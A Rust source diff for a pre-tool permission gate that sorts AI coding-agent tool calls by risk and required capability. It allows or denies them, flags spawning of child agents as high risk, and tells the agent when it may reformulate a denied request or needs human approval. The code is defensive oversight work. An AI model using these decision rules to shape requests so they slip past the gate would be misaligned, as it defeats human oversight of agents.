@@ -1,7 +1,7 @@
 //! Deterministic, provider-neutral pre-tool risk/exposure assessment.
 //!
 //! Deterministic classifications remain authoritative for known effects. In
-//! blacklist/heuristic mode, callers may use the typed semantic result to
+//! denylist/heuristic mode, callers may use the typed semantic result to
 //! resolve an otherwise opaque effect before applying state capabilities. The
 //! assessment contains no arguments or payloads.
 
@@ -9,6 +9,7 @@ use crate::{
     bash_classifier::{self, OpClass},
     protocol::ToolInfo,
     shell_ast_shadow::{self, AstShadowAssessment, ParseStatus, ShellAstSemanticShape},
+    tool_intent::{NativeToolFamily, native_tool_family},
 };
 use serde::{Deserialize, Serialize};
 use std::sync::OnceLock;
@@ -72,6 +73,12 @@ pub struct SemanticRiskVector {
 pub enum ResolvedEffect {
     ReadOnly,
     LocalWrite,
+    BoundedLocalExecution,
+    GitLocalWrite,
+    LocalWriteAndGitLocalWrite,
+    LocalWriteAndBoundedLocalExecution,
+    BoundedLocalExecutionAndGitLocalWrite,
+    LocalWriteAndBoundedLocalExecutionAndGitLocalWrite,
     DenyKnownRisk,
     DenyUncertain,
 }
@@ -184,6 +191,15 @@ fn mcp_operation(tool_name: &str) -> &str {
         .and_then(|qualified| qualified.split_once("__"))
         .map(|(_, operation)| operation)
         .unwrap_or(tool_name)
+}
+
+fn is_agent_delegation_tool(tool_name: &str) -> bool {
+    let compact: String = mcp_operation(tool_name)
+        .chars()
+        .filter(|character| character.is_ascii_alphanumeric())
+        .flat_map(char::to_lowercase)
+        .collect();
+    compact == "agent" || compact == "spawnagent" || compact.ends_with("collaborationspawnagent")
 }
 
 fn mcp_operation_intent(operation: &str) -> McpOperationIntent {
@@ -304,36 +320,149 @@ pub struct RiskPipelineAssessment {
     pub semantic_authorization_enabled: bool,
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum FinalDecisionContext<'a> {
+    Allowed,
+    Denied {
+        basis: &'a str,
+        required_authority: &'a str,
+    },
+}
+
+impl<'a> FinalDecisionContext<'a> {
+    pub const fn denied(basis: &'a str, required_authority: &'a str) -> Self {
+        Self::Denied {
+            basis,
+            required_authority,
+        }
+    }
+}
+
 impl RiskPipelineAssessment {
+    fn reformulation_allowed(basis: &str) -> bool {
+        matches!(
+            basis,
+            "semantic_threshold_not_met"
+                | "incomplete_structural_evidence"
+                | "semantic_vector_unavailable"
+                | "semantic_assessment_incomplete"
+                | "semantic_authorization_disabled"
+        )
+    }
+
+    fn intent_fingerprint(&self) -> String {
+        // Fingerprint only the already-redacted semantic request.  Provider
+        // shims use this identity to recognize a repeated intent without
+        // retaining command text, paths, arguments, or payload values.
+        let bytes = self
+            .deterministic
+            .semantic_request
+            .as_ref()
+            .and_then(|request| serde_json::to_vec(request).ok())
+            .unwrap_or_else(|| {
+                format!(
+                    "{}|{}|{}",
+                    self.semantic.tool,
+                    self.deterministic.source,
+                    self.deterministic.required_capability.unwrap_or("none")
+                )
+                .into_bytes()
+            });
+        format!(
+            "intent_v1_{}",
+            uuid::Uuid::new_v5(&uuid::Uuid::NAMESPACE_OID, &bytes).as_simple()
+        )
+    }
+
+    fn deterministic_local_effect(&self) -> ResolvedEffect {
+        match self.deterministic.required_capability {
+            Some("BoundedLocalExecution") => ResolvedEffect::BoundedLocalExecution,
+            Some("GitLocalWrite") => ResolvedEffect::GitLocalWrite,
+            Some("Write+GitLocalWrite") => ResolvedEffect::LocalWriteAndGitLocalWrite,
+            Some("Write+BoundedLocalExecution") => {
+                ResolvedEffect::LocalWriteAndBoundedLocalExecution
+            }
+            Some("BoundedLocalExecution+GitLocalWrite") => {
+                ResolvedEffect::BoundedLocalExecutionAndGitLocalWrite
+            }
+            Some("Write+BoundedLocalExecution+GitLocalWrite") => {
+                ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite
+            }
+            _ => ResolvedEffect::LocalWrite,
+        }
+    }
+
+    fn semantic_local_effect(&self) -> ResolvedEffect {
+        match self.deterministic.required_capability {
+            Some("BoundedLocalExecution") => ResolvedEffect::LocalWriteAndBoundedLocalExecution,
+            Some("GitLocalWrite" | "Write+GitLocalWrite") => {
+                ResolvedEffect::LocalWriteAndGitLocalWrite
+            }
+            Some("Write+BoundedLocalExecution") => {
+                ResolvedEffect::LocalWriteAndBoundedLocalExecution
+            }
+            Some(
+                "BoundedLocalExecution+GitLocalWrite" | "Write+BoundedLocalExecution+GitLocalWrite",
+            ) => ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite,
+            _ => ResolvedEffect::LocalWrite,
+        }
+    }
+
     /// Resolve an effect class without letting inference downgrade a known
     /// high/critical operation or silently authorize an uncertain result.
     /// This is not final authorization: callers must enforce the state's
     /// explicit capability denials against `ReadOnly` or `LocalWrite`.
     pub fn resolve_effect(&self) -> ResolvedEffect {
+        self.resolve_effect_with_basis().0
+    }
+
+    /// Return the selected effect and a stable, payload-free explanation code.
+    pub fn resolve_effect_with_basis(&self) -> (ResolvedEffect, &'static str) {
         use ResolvedEffect::*;
         if matches!(self.effective_risk, RiskBand::High | RiskBand::Critical) {
-            return DenyKnownRisk;
+            return (DenyKnownRisk, "effective_known_risk");
         }
         match self.deterministic.risk {
-            RiskBand::Critical | RiskBand::High => DenyKnownRisk,
-            RiskBand::Low if self.effective_risk == RiskBand::Low => ReadOnly,
-            RiskBand::Low => LocalWrite,
-            RiskBand::Moderate if self.deterministic.exposure == ExposureBand::Local => LocalWrite,
+            RiskBand::Critical | RiskBand::High => (DenyKnownRisk, "deterministic_known_risk"),
+            RiskBand::Low if self.effective_risk == RiskBand::Low => {
+                (ReadOnly, "deterministic_read_only")
+            }
+            RiskBand::Low => (LocalWrite, "semantic_risk_escalation"),
+            RiskBand::Moderate if self.deterministic.exposure == ExposureBand::Local => {
+                let effect = self.deterministic_local_effect();
+                let basis = match effect {
+                    BoundedLocalExecution => "deterministic_bounded_local_execution",
+                    GitLocalWrite => "deterministic_git_local_write",
+                    LocalWriteAndGitLocalWrite => "deterministic_combined_local_write",
+                    LocalWriteAndBoundedLocalExecution => {
+                        "deterministic_local_write_and_bounded_execution"
+                    }
+                    BoundedLocalExecutionAndGitLocalWrite => {
+                        "deterministic_bounded_execution_and_git_local_write"
+                    }
+                    LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
+                        "deterministic_combined_local_execution"
+                    }
+                    _ => "deterministic_local_write",
+                };
+                (effect, basis)
+            }
             RiskBand::Moderate if self.deterministic.exposure == ExposureBand::Unknown => {
                 if !self.semantic_authorization_enabled {
-                    return DenyUncertain;
+                    return (DenyUncertain, "semantic_authorization_disabled");
                 }
                 if !self.has_sufficient_semantic_evidence() {
-                    return DenyUncertain;
+                    return (DenyUncertain, "incomplete_structural_evidence");
                 }
                 let Some(vector) = self.semantic.vector.as_ref() else {
-                    return DenyUncertain;
+                    return (DenyUncertain, "semantic_vector_unavailable");
                 };
                 if self.semantic.status != SemanticAssessorStatus::Assessed {
-                    return DenyUncertain;
+                    return (DenyUncertain, "semantic_assessment_incomplete");
                 }
                 let request = self.deterministic.semantic_request.as_ref().unwrap();
-                let compatible_read = request.read_only_hint != Some(false)
+                let compatible_read = self.deterministic.required_capability.is_none()
+                    && request.read_only_hint != Some(false)
                     && request.mcp_shape.as_ref().is_none_or(|shape| {
                         shape.operation_intent != McpOperationIntent::Write
                             && shape.selector_intent != Some(McpOperationIntent::Write)
@@ -345,19 +474,19 @@ impl RiskPipelineAssessment {
                     && vector.irreversible.get() <= 0.05
                     && vector.external_or_account_effect.get() <= 0.05
                 {
-                    ReadOnly
+                    (ReadOnly, "semantic_read_only")
                 } else if vector.may_write.get() >= 0.90
                     && vector.reversible.get() >= 0.80
                     && vector.destructive.get() <= 0.05
                     && vector.irreversible.get() <= 0.05
                     && vector.external_or_account_effect.get() <= 0.05
                 {
-                    LocalWrite
+                    (self.semantic_local_effect(), "semantic_local_write")
                 } else {
-                    DenyUncertain
+                    (DenyUncertain, "semantic_threshold_not_met")
                 }
             }
-            RiskBand::Moderate => DenyKnownRisk,
+            RiskBand::Moderate => (DenyKnownRisk, "deterministic_nonlocal_risk"),
         }
     }
 
@@ -367,10 +496,17 @@ impl RiskPipelineAssessment {
             .as_ref()
             .is_some_and(|request| {
                 if request.tool_family == "shell" {
-                    !request.shell_shape.is_empty()
+                    request.shell_ast_shape.as_ref().is_some_and(|shape| {
+                        shape.status == ParseStatus::Parsed
+                            && shape.executable_nodes > 0
+                            && !shape.effect_candidates.is_empty()
+                            && shape.foreign_code_units
+                                == shape.foreign_code_units_with_complete_effect_evidence
+                            && !request.shell_shape.is_empty()
+                    }) || (!request.shell_shape.is_empty()
                         && request.shell_shape.iter().all(|segment| {
                             segment.operation.is_some() && !segment.delegates_unknown_effect
-                        })
+                        }))
                 } else {
                     request.tool_name != "unknown"
                         && request
@@ -385,6 +521,45 @@ impl RiskPipelineAssessment {
     /// labels and bounded probabilities only--never arguments, command text,
     /// paths, or payload values.
     pub fn visible_json(&self) -> serde_json::Value {
+        self.visible_json_for_decision(FinalDecisionContext::Allowed)
+    }
+
+    /// Attach the final policy decision to the classifier receipt. A
+    /// classifier-resolved read or local write may still be denied by the
+    /// workflow capability or interceptor, in which case an equivalent retry
+    /// must not be suggested.
+    pub fn visible_json_for_decision(
+        &self,
+        final_decision: FinalDecisionContext<'_>,
+    ) -> serde_json::Value {
+        let (resolved_effect, resolution_basis) = self.resolve_effect_with_basis();
+        let (decision_allowed, final_denial_basis, required_authority) = match final_decision {
+            FinalDecisionContext::Allowed => (
+                true,
+                serde_json::Value::Null,
+                resolved_effect.required_authority(),
+            ),
+            FinalDecisionContext::Denied {
+                basis,
+                required_authority,
+            } => (false, serde_json::json!(basis), required_authority),
+        };
+        let effective_denial_basis = final_denial_basis.as_str().unwrap_or(resolution_basis);
+        let reformulation_allowed = matches!(resolved_effect, ResolvedEffect::DenyUncertain)
+            && Self::reformulation_allowed(effective_denial_basis);
+        let exact_invocation_retry_allowed = decision_allowed
+            && !matches!(
+                resolved_effect,
+                ResolvedEffect::DenyKnownRisk | ResolvedEffect::DenyUncertain
+            );
+        // A human may resolve classifier uncertainty only when the gateway's
+        // final decision explicitly offers the separate-approval authority.
+        // Capability, policy, interceptor, and known-risk denials must never
+        // become approvable merely because an adapter recognizes their label.
+        let separate_approval_allowed = !decision_allowed
+            && matches!(resolved_effect, ResolvedEffect::DenyUncertain)
+            && reformulation_allowed
+            && required_authority == "complete_structural_evidence_or_separate_approval";
         let vector = self.semantic.vector.as_ref().map(|value| {
             serde_json::json!({
                 "read_only": value.read_only.get(),
@@ -396,6 +571,8 @@ impl RiskPipelineAssessment {
             })
         });
         serde_json::json!({
+            "intent_fingerprint": self.intent_fingerprint(),
+            "invocation_fingerprint": self.deterministic.invocation_fingerprint,
             "deterministic_risk": format!("{:?}", self.deterministic.risk),
             "deterministic_exposure": format!("{:?}", self.deterministic.exposure),
             "deterministic_source": self.deterministic.source,
@@ -404,7 +581,65 @@ impl RiskPipelineAssessment {
             "semantic_vector": vector,
             "semantic_failsafe_escalated": self.semantic_failsafe_escalated,
             "semantic_authorization_enabled": self.semantic_authorization_enabled,
+            "resolved_effect": resolved_effect.label(),
+            "resolution_basis": resolution_basis,
+            "final_denial_basis": final_denial_basis,
+            "required_authority": required_authority,
+            // Compatibility field consumed by existing adapters. For an
+            // uncertain classifier denial it means the agent may reformulate
+            // the request on the failed structural axis; it never authorizes
+            // replaying the exact denied invocation.
+            "equivalent_retry_allowed": exact_invocation_retry_allowed || reformulation_allowed,
+            "reformulation_allowed": reformulation_allowed,
+            "exact_invocation_retry_allowed": exact_invocation_retry_allowed,
+            "separate_approval_allowed": separate_approval_allowed,
         })
+    }
+
+    pub fn visible_json_for_denial(
+        &self,
+        basis: &str,
+        required_authority: &str,
+    ) -> serde_json::Value {
+        self.visible_json_for_decision(FinalDecisionContext::denied(basis, required_authority))
+    }
+}
+
+impl ResolvedEffect {
+    pub const fn label(self) -> &'static str {
+        match self {
+            Self::ReadOnly => "read_only",
+            Self::LocalWrite => "local_write",
+            Self::BoundedLocalExecution => "bounded_local_execution",
+            Self::GitLocalWrite => "git_local_write",
+            Self::LocalWriteAndGitLocalWrite => "local_write_and_git_local_write",
+            Self::LocalWriteAndBoundedLocalExecution => "local_write_and_bounded_local_execution",
+            Self::BoundedLocalExecutionAndGitLocalWrite => {
+                "bounded_local_execution_and_git_local_write"
+            }
+            Self::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
+                "local_write_and_bounded_local_execution_and_git_local_write"
+            }
+            Self::DenyKnownRisk => "deny_known_risk",
+            Self::DenyUncertain => "deny_uncertain",
+        }
+    }
+
+    pub const fn required_authority(self) -> &'static str {
+        match self {
+            Self::ReadOnly => "Read",
+            Self::LocalWrite => "Write",
+            Self::BoundedLocalExecution => "BoundedLocalExecution",
+            Self::GitLocalWrite => "GitLocalWrite",
+            Self::LocalWriteAndGitLocalWrite => "Write+GitLocalWrite",
+            Self::LocalWriteAndBoundedLocalExecution => "Write+BoundedLocalExecution",
+            Self::BoundedLocalExecutionAndGitLocalWrite => "BoundedLocalExecution+GitLocalWrite",
+            Self::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
+                "Write+BoundedLocalExecution+GitLocalWrite"
+            }
+            Self::DenyKnownRisk => "separate_approved_execution_path",
+            Self::DenyUncertain => "complete_structural_evidence_or_separate_approval",
+        }
     }
 }
 
@@ -811,6 +1046,8 @@ pub struct ShadowAssessment {
     /// Workflow intent is context for calibration only; it never changes the
     /// deterministic authorization decision in this shadow-only milestone.
     pub state_intent: Option<String>,
+    invocation_fingerprint: Option<String>,
+    required_capability: Option<&'static str>,
     semantic_request: Option<SemanticAssessmentRequest>,
     ast_semantic_request: Option<SemanticAssessmentRequest>,
 }
@@ -1072,26 +1309,63 @@ pub fn assess_shell(command: &str) -> ShadowAssessment {
     if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
         return assessment(RiskBand::High, ExposureBand::External, "shell");
     }
-    if classes.contains(&OpClass::Opaque) {
-        return assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell");
-    }
     // The read-only proof is stricter than the broad operation classifier and
     // rejects redirects, expansions, and path-qualified lookalikes.
     if bash_classifier::readonly_capabilities(command).is_some() {
         return assessment(RiskBand::Low, ExposureBand::Local, "shell");
     }
+    let required_capability = local_effect_capability(&classes);
     // A proven local effect cannot erase another segment whose effect remains
     // unclassified. Known harmless stdout commands use SafeOutput instead.
-    if classes.contains(&OpClass::Passthrough) {
-        return assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell");
+    if classes
+        .iter()
+        .any(|class| matches!(class, OpClass::Opaque | OpClass::Passthrough))
+    {
+        return required_capability.map_or_else(
+            || assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+            |capability| {
+                assessment_with_capability(
+                    RiskBand::Moderate,
+                    ExposureBand::Unknown,
+                    "shell",
+                    capability,
+                )
+            },
+        );
     }
-    if classes.contains(&OpClass::LocalWrite) {
-        return assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
-    }
-    if classes.contains(&OpClass::FileWrite) || classes.contains(&OpClass::FileModify) {
-        return assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
+    if let Some(capability) = required_capability {
+        return assessment_with_capability(
+            RiskBand::Moderate,
+            ExposureBand::Local,
+            "shell",
+            capability,
+        );
     }
     assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+}
+
+/// Reduce independently classified local effects to an explicit capability
+/// union. Read-only companions do not change the union; no local effect can
+/// erase another merely because it appeared later in a compound command.
+fn local_effect_capability(classes: &[OpClass]) -> Option<&'static str> {
+    let has_write = classes.iter().any(|class| {
+        matches!(
+            class,
+            OpClass::FileWrite | OpClass::FileModify | OpClass::LocalWrite
+        )
+    });
+    let has_bounded_execution = classes.contains(&OpClass::BoundedLocalExecution);
+    let has_git_local_write = classes.contains(&OpClass::GitLocalWrite);
+    match (has_write, has_bounded_execution, has_git_local_write) {
+        (false, false, false) => None,
+        (true, false, false) => Some("Write"),
+        (false, true, false) => Some("BoundedLocalExecution"),
+        (false, false, true) => Some("GitLocalWrite"),
+        (true, true, false) => Some("Write+BoundedLocalExecution"),
+        (true, false, true) => Some("Write+GitLocalWrite"),
+        (false, true, true) => Some("BoundedLocalExecution+GitLocalWrite"),
+        (true, true, true) => Some("Write+BoundedLocalExecution+GitLocalWrite"),
+    }
 }
 
 fn shell_ast_shadow_enabled() -> bool {
@@ -1143,16 +1417,30 @@ fn assess_shell_ast(ast: &AstShadowAssessment) -> ShadowAssessment {
     if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
         return assessment(RiskBand::High, ExposureBand::External, "shell_ast");
     }
-    if classes.contains(&OpClass::Opaque) || classes.contains(&OpClass::Passthrough) {
-        return assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell_ast");
+    let required_capability = local_effect_capability(classes);
+    let opaque_is_covered_foreign_wrapper = foreign_wrapper_is_fully_classified(ast);
+    if (classes.contains(&OpClass::Opaque) || classes.contains(&OpClass::Passthrough))
+        && !opaque_is_covered_foreign_wrapper
+    {
+        return required_capability.map_or_else(
+            || assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell_ast"),
+            |capability| {
+                assessment_with_capability(
+                    RiskBand::Moderate,
+                    ExposureBand::Unknown,
+                    "shell_ast",
+                    capability,
+                )
+            },
+        );
     }
-    if classes.iter().any(|class| {
-        matches!(
-            class,
-            OpClass::FileWrite | OpClass::FileModify | OpClass::LocalWrite
-        )
-    }) {
-        return assessment(RiskBand::Moderate, ExposureBand::Local, "shell_ast");
+    if let Some(capability) = required_capability {
+        return assessment_with_capability(
+            RiskBand::Moderate,
+            ExposureBand::Local,
+            "shell_ast",
+            capability,
+        );
     }
     if classes.iter().all(|class| {
         matches!(
@@ -1162,11 +1450,20 @@ fn assess_shell_ast(ast: &AstShadowAssessment) -> ShadowAssessment {
                 | OpClass::FileSearch
                 | OpClass::GitRead
                 | OpClass::SafeOutput
-        )
+        ) || (opaque_is_covered_foreign_wrapper
+            && matches!(class, OpClass::Opaque | OpClass::Passthrough))
     }) {
         return assessment(RiskBand::Low, ExposureBand::Local, "shell_ast");
     }
     assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell_ast")
+}
+
+fn foreign_wrapper_is_fully_classified(ast: &AstShadowAssessment) -> bool {
+    ast.status == ParseStatus::Parsed
+        && ast.foreign_code_units > 0
+        && ast.executable_nodes == ast.foreign_code_units
+        && ast.foreign_code_units == ast.foreign_code_units_with_complete_effect_evidence
+        && ast.opaque_heredocs == 0
 }
 
 fn exposure_rank(exposure: ExposureBand) -> u8 {
@@ -1179,9 +1476,9 @@ fn exposure_rank(exposure: ExposureBand) -> u8 {
 }
 
 /// Select the structured assessment only when it is complete and cannot erase
-/// a known effect. The one permitted downgrade is the purpose of this
-/// promotion: a fully parsed local read may replace a legacy Moderate/Unknown
-/// result caused by compound shell syntax.
+/// a known effect. A fully parsed local read or explicit local capability union
+/// may replace a legacy Moderate/Unknown result caused by compound shell
+/// syntax; unresolved leaves remain Unknown and cannot take this path.
 fn ast_authority_wins(
     legacy: &ShadowAssessment,
     ast: &ShadowAssessment,
@@ -1211,8 +1508,15 @@ fn apply_shell_ast_authority(
 ) -> ShadowAssessment {
     let mut structured = assess_shell_ast(ast);
     structured.state_intent = legacy.state_intent.clone();
+    structured.invocation_fingerprint = legacy.invocation_fingerprint.clone();
     structured.semantic_request = Some(ast_request.clone());
-    if ast_authority_wins(&legacy, &structured, ast.status) {
+    let complete_structural_local_effect = legacy.risk == RiskBand::Moderate
+        && legacy.exposure == ExposureBand::Unknown
+        && structured.risk == RiskBand::Moderate
+        && structured.exposure == ExposureBand::Local
+        && structured.required_capability.is_some()
+        && ast.status == ParseStatus::Parsed;
+    if ast_authority_wins(&legacy, &structured, ast.status) || complete_structural_local_effect {
         structured
     } else {
         // Preserve comparison telemetry when an incomplete or weaker AST
@@ -1286,24 +1590,15 @@ fn assess_invocation_with_origin(
                 .and_then(|value| value.as_str())
         })
         .flatten();
+    let known_native_write = !is_shell
+        && trusted_native_adapter
+        && tool.is_none()
+        && native_tool_family(tool_name) == Some(NativeToolFamily::Write);
     let mut result = if is_shell {
         shell_command
             .map(assess_shell)
             .unwrap_or_else(|| assess_mcp(tool, tool_name))
     } else {
-        let known_native_write = trusted_native_adapter
-            && matches!(
-                tool_name,
-                "Write"
-                    | "Edit"
-                    | "MultiEdit"
-                    | "apply_patch"
-                    | "write_file"
-                    | "edit_file"
-                    | "patch_file"
-                    | "create_file"
-                    | "create_or_update_file"
-            );
         let base = if known_native_write {
             assessment(RiskBand::Moderate, ExposureBand::Local, "native_write")
         } else {
@@ -1311,7 +1606,7 @@ fn assess_invocation_with_origin(
         };
         let shape = mcp_shape(tool, tool_name, arguments);
         // Invocation-level effects can raise risk, never erase a known risk.
-        if matches!(base.risk, RiskBand::High | RiskBand::Critical) {
+        if known_native_write || matches!(base.risk, RiskBand::High | RiskBand::Critical) {
             base
         } else {
             match shape.selector_intent {
@@ -1330,6 +1625,7 @@ fn assess_invocation_with_origin(
             }
         }
     };
+    result.invocation_fingerprint = Some(invocation_fingerprint(tool_name, arguments));
     result.state_intent = state_intent.map(str::to_owned);
     let semantic_request = semantic_request(tool, tool_name, arguments, state_intent, is_shell);
     result.semantic_request = Some(semantic_request.clone());
@@ -1419,8 +1715,8 @@ pub async fn assess_pipeline_visible(
 
 /// Assess a call arriving through the trusted Codex/Claude native-tool
 /// adapter. This provenance is what permits canonical filesystem Write tools
-/// to remain local; an upstream MCP tool with a colliding name never receives
-/// this treatment.
+/// to remain local when no upstream registration exists. A registered MCP tool
+/// with a colliding name retains its metadata-derived remote/unknown posture.
 pub async fn assess_native_pipeline_visible(
     tool: Option<&ToolInfo>,
     tool_name: &str,
@@ -1563,6 +1859,216 @@ fn pipeline_from_parts(
     }
 }
 
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct LocalCommandEvidence {
+    schema: String,
+    tool_name: String,
+    command: String,
+    requested_cwd: Option<String>,
+    cwd: Option<String>,
+    invocation: bash_classifier::LiteralInvocation,
+    collected_at_ms: i64,
+    complete: bool,
+    commands: Vec<LocalCommandUnit>,
+    files: Vec<LocalCommandFile>,
+    reason: Option<String>,
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct LocalCommandUnit {
+    original: String,
+    resolved: String,
+    cwd: String,
+    invocation: Option<bash_classifier::LiteralInvocation>,
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct LocalCommandFile {
+    path: String,
+    sha256: String,
+}
+
+/// Only the native adapter invokes this boundary. Evidence is generated from
+/// current local bytes by the managed hook, not from model-authored tool input.
+/// As with GitLocalWrite, the local account/plugin is trusted, not attested
+/// against malicious same-user tampering. Never expose these bytes to System One.
+pub fn apply_native_command_evidence(
+    pipeline: RiskPipelineAssessment,
+    registered_tool: Option<&ToolInfo>,
+    tool_name: &str,
+    arguments: &serde_json::Value,
+    evidence: Option<&serde_json::Value>,
+) -> RiskPipelineAssessment {
+    let Some(evidence) = evidence.filter(|value| !value.is_null()) else {
+        return pipeline;
+    };
+    if registered_tool.is_some()
+        || native_tool_family(tool_name) != Some(NativeToolFamily::Command)
+        || matches!(
+            pipeline.deterministic.risk,
+            RiskBand::High | RiskBand::Critical
+        )
+    {
+        return pipeline;
+    }
+    let command = arguments
+        .get("command")
+        .or_else(|| arguments.get("cmd"))
+        .and_then(|v| v.as_str());
+    let Some(command) = command else {
+        return pipeline;
+    };
+    let Some(invocation) = bash_classifier::literal_invocation(command) else {
+        return pipeline;
+    };
+    let supported_root = match (invocation.executable.as_str(), invocation.args.as_slice()) {
+        ("task", [target]) => !target.starts_with('-'),
+        ("task", [flag, directory, target]) if matches!(flag.as_str(), "-d" | "--dir") => {
+            !directory.is_empty() && !target.starts_with('-')
+        }
+        ("task", [flag, target]) if flag.starts_with("--dir=") => {
+            flag.len() > "--dir=".len() && !target.starts_with('-')
+        }
+        ("npm" | "pnpm", [op]) => op == "test",
+        ("npm" | "pnpm", [op, name]) => op == "run" && !name.starts_with('-'),
+        ("npx", [runner, op, ..]) => runner == "vitest" && op == "run",
+        ("vitest", [op, ..]) => op == "run",
+        ("node", _) => bash_classifier::bounded_node_repository_entrypoint(&invocation).is_some(),
+        _ => false,
+    };
+    if !supported_root {
+        return pipeline;
+    }
+    let mut deterministic = pipeline.deterministic;
+    let incomplete = |mut value: ShadowAssessment| {
+        value.risk = RiskBand::Moderate;
+        value.exposure = ExposureBand::Unknown;
+        value.source = "native_command_evidence_incomplete";
+        pipeline_from_parts(value, pipeline.semantic.clone(), false)
+    };
+    if evidence.to_string().len() > 128 * 1024 {
+        return incomplete(deterministic);
+    }
+    let Ok(proof) = serde_json::from_value::<LocalCommandEvidence>(evidence.clone()) else {
+        return incomplete(deterministic);
+    };
+    let requested_cwd = arguments
+        .get("workdir")
+        .or_else(|| arguments.get("cwd"))
+        .and_then(|v| v.as_str());
+    let age = chrono::Utc::now()
+        .timestamp_millis()
+        .saturating_sub(proof.collected_at_ms);
+    if proof.schema != "statewright/local-command-evidence/v1"
+        || proof.tool_name != tool_name
+        || proof.command != command
+        || proof.invocation != invocation
+        || proof.requested_cwd.as_deref() != requested_cwd
+        || !proof
+            .cwd
+            .as_deref()
+            .is_some_and(|cwd| std::path::Path::new(cwd).is_absolute())
+        || !(-5000..=30000).contains(&age)
+        || !proof.complete
+        || proof.reason.is_some()
+        || proof.commands.is_empty()
+        || proof.commands.len() > 32
+        || proof.files.is_empty()
+        || proof.files.len() > 64
+        || proof.files.iter().any(|file| {
+            file.path.is_empty()
+                || std::path::Path::new(&file.path).is_absolute()
+                || file.path.split('/').any(|p| matches!(p, "" | "." | ".."))
+                || file.sha256.len() != 64
+                || !file.sha256.bytes().all(|b| b.is_ascii_hexdigit())
+        })
+    {
+        return incomplete(deterministic);
+    }
+    let mut classes = vec![OpClass::BoundedLocalExecution];
+    for unit in &proof.commands {
+        if unit.original.len() > 8192 || unit.resolved.len() > 8192 {
+            return incomplete(deterministic);
+        }
+        let parsed_unit_invocation = bash_classifier::literal_invocation(&unit.original);
+        if unit.invocation != parsed_unit_invocation
+            || (unit.cwd != "."
+                && (unit.cwd.is_empty()
+                    || std::path::Path::new(&unit.cwd).is_absolute()
+                    || unit
+                        .cwd
+                        .split('/')
+                        .any(|part| matches!(part, "" | "." | ".."))))
+        {
+            return incomplete(deterministic);
+        }
+        if let Some(entrypoint) = parsed_unit_invocation
+            .as_ref()
+            .and_then(bash_classifier::bounded_node_repository_entrypoint)
+        {
+            if unit.original != unit.resolved {
+                return incomplete(deterministic);
+            }
+            let bound_path = if unit.cwd == "." {
+                entrypoint.to_owned()
+            } else {
+                format!("{}/{entrypoint}", unit.cwd)
+            };
+            if !proof.files.iter().any(|file| file.path == bound_path) {
+                return incomplete(deterministic);
+            }
+            classes.push(OpClass::BoundedLocalExecution);
+            continue;
+        }
+        if unit.original != unit.resolved {
+            let Some(unit_invocation) = parsed_unit_invocation.as_ref() else {
+                return incomplete(deterministic);
+            };
+            if unit_invocation.executable != "npx"
+                || unit_invocation.args.first().map(String::as_str) != Some("vitest")
+            {
+                return incomplete(deterministic);
+            }
+            let mut expected = vec!["node_modules/.bin/vitest".to_owned()];
+            expected.extend(unit_invocation.args.iter().skip(1).cloned());
+            if bash_classifier::simple_command_tokens(&unit.resolved).as_ref() != Some(&expected)
+                || bash_classifier::classify(&unit.resolved) != vec![OpClass::BoundedLocalExecution]
+            {
+                return incomplete(deterministic);
+            }
+        }
+        let ast = shell_ast_shadow::assess(&unit.resolved);
+        if ast.status != ParseStatus::Parsed {
+            classes.push(OpClass::Opaque);
+        }
+        classes.extend(ast.classes);
+    }
+    // Every expanded execution unit contributes to the risk/capability union.
+    // Incomplete leaves cannot erase a known write, delete or network operation.
+    let known = if classes.contains(&OpClass::Destructive) {
+        (RiskBand::Critical, ExposureBand::Local)
+    } else if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
+        (RiskBand::High, ExposureBand::External)
+    } else if classes
+        .iter()
+        .any(|c| matches!(c, OpClass::Opaque | OpClass::Passthrough))
+    {
+        (RiskBand::Moderate, ExposureBand::Unknown)
+    } else {
+        (RiskBand::Moderate, ExposureBand::Local)
+    };
+    deterministic.risk = known.0;
+    deterministic.exposure = known.1;
+    deterministic.required_capability = local_effect_capability(&classes);
+    deterministic.source = "native_command_evidence";
+    // Unresolved expansions need more structural evidence, not a probability
+    // inferred from the innocent name of their original wrapper.
+    pipeline_from_parts(deterministic, pipeline.semantic, false)
+}
+
 fn semantic_failsafe_floor(
     deterministic: RiskBand,
     semantic: &SemanticAssessmentReceipt,
@@ -1597,6 +2103,18 @@ fn risk_rank(risk: RiskBand) -> u8 {
 
 pub fn assess_mcp(tool: Option<&ToolInfo>, tool_name: &str) -> ShadowAssessment {
     let operation_intent = mcp_operation_intent(mcp_operation(tool_name));
+    // A child agent receives a separate tool surface and can exercise authority
+    // that is not bounded by the current invocation. Keep delegation distinct
+    // from an opaque MCP call so provider shims can prefer inline recovery or
+    // route a real model/role change through a Statewright-managed fork. A
+    // one-shot approval must never grant an unbounded raw child tool surface.
+    if is_agent_delegation_tool(tool_name) {
+        return assessment(
+            RiskBand::High,
+            ExposureBand::Unknown,
+            "unmanaged_agent_delegation",
+        );
+    }
     if let Some(tool) = tool {
         // Negative evidence takes precedence over an optimistic read hint.
         if tool.annotations.as_ref().and_then(|a| a.destructive_hint) == Some(true) {
@@ -1661,8 +2179,35 @@ fn assessment(risk: RiskBand, exposure: ExposureBand, source: &'static str) -> S
         exposure,
         source,
         state_intent: None,
+        invocation_fingerprint: None,
